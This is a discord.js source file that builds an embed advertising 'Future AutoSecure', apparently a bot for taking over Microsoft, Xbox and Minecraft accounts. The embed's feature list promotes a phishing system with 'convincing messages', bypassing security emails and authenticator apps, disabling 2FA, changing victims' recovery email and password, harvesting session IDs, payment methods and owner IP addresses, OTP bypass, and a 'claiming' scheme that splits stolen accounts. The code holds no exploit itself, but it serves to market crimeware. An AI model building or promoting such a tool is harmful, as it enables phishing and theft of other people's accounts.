const { EmbedBuilder } = require("discord.js");

const BANNER_GIF =
  "https://cdn.discordapp.com/attachments/1457511997724823677/1458729090256212044/standard.gif";

const EMBED_COLOR = 0xB8D2F0;
const DIVIDER = "━━━━━━━━━━━━━━━━━━";

/**
 * Builds the AutoSecure feature panel embed
 * @param {import('discord.js').Guild|null} guild Optional guild (for server icon)
 */
async function featurepanel(guild = null) {
  try {
    const guildIcon = guild?.iconURL?.({ size: 256 }) ?? null;

    const embed = new EmbedBuilder()
      .setTitle("<a:bots:1459163572323225661> Future AutoSecure — Feature Overview")
      .setDescription(
        [
          "**The most trusted AutoSecure system**",
          "",
          DIVIDER,
          "A complete security, recovery, and protection suite for accounts.",
          DIVIDER,
        ].join("\n")
      )
      .setColor(EMBED_COLOR)
      .setImage(BANNER_GIF)
      .setTimestamp()
      .setFooter({
        text: "Future Autosecure • Powered By Future Developement!",
        iconURL: guildIcon ?? undefined,
      });

    if (guildIcon) {
      embed.setThumbnail(guildIcon); // ✅ server icon thumbnail
    }

    embed.addFields(
      {
        name: "🪝 Phisher System",
        value:
          "- Multiple verification modes\n" +
          "- Email verification\n" +
          "- Customizable, convincing messages\n" +
          "- Bypasses security emails, phone numbers & auth apps\n" +
          "- Stat embeds to view user activity\n" +
          "- Anti-spam protection\n" +
          "- Auto OAuth sending if OTP is disabled\n" +
          "- Ban / kick / unban / blacklist buttons\n" +
          "- Optional post-verification actions (kick, ban, role, DM)",
      },
      {
        name: "🔐 AutoSecure Core",
        value:
          "- Disable 2FA\n" +
          "- Generate recovery codes\n" +
          "- Change security email & password\n" +
          "- Remove Windows Hello keys (Zyger exploit)\n" +
          "- Sign out of all locations\n" +
          "- Minecraft ownership & cape checks\n" +
          "- SSID retrieval\n" +
          "- Xbox gamertag, subscriptions & purchases\n" +
          "- Payment methods & Microsoft Points\n" +
          "- IP address & original owner info\n" +
          "- Microsoft account info management",
      },
      {
        name: "⚙️ Optional Features",
        value:
          "- Secure accounts without Minecraft\n" +
          "- Disable multiplayer\n" +
          "- Change primary alias (0–2 times)\n" +
          "- Change Minecraft username\n" +
          "- Auto-enable Zyger 2FA\n" +
          "- Remove all apps & OAuths\n" +
          "- Hypixel ban checks\n" +
          "- Change Xbox gamertag\n" +
          "- Remove connected devices",
      },
      {
        name: "📦 Claiming System",
        value:
          "- Full account or SSID-only claiming\n" +
          "- Auto-split system (owner-defined ratios)\n" +
          "- Owner safety fallback if user receives nothing\n" +
          "- Unclaimed account panel\n" +
          "- Auto-claim to owner after 1–7 days",
      },
      {
        name: "🧭 How Do I Use It?",
        value:
          "- `/secure` (OTP, Recovery Code, MSAUTH, Secret Key)\n" +
          "- Built-in phisher system",
      },
      {
        name: "🚀 Coming Soon",
        value:
          "- Outlook email access\n" +
          "- Automatic game & valuable detection",
      },
      {
        name: "📚 Extra Commands",
        value:
          "- `/ssidchecker` — SSID information\n" +
          "- `/quarantine` — Hypixel login spam protection\n" +
          "- `/mail inbox` — View inbox\n" +
          "- `/mail register` — Register unique email\n" +
          "- `/mail list` — View saved emails\n" +
          "- `/requestotp` — OTP bypass\n" +
          "- `/checkban` — SSID ban check\n" +
          "- `/appeal` — Auto-appeal Hypixel bans",
      }
    );

    return {
      content: " ", // ✅ never empty (prevents Discord errors)
      embeds: [embed],
    };
  } catch (error) {
    console.error("Error creating feature panel:", error);
    return {
      content: "❌ Failed to generate feature panel.",
      embeds: [],
    };
  }
}

module.exports = featurepanel;

/* =========================
   LOCAL TEST (SAFE)
========================= */
if (require.main === module) {
  featurepanel(null)
    .then((msgObject) => {
      console.log("Message Object:", msgObject);
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}
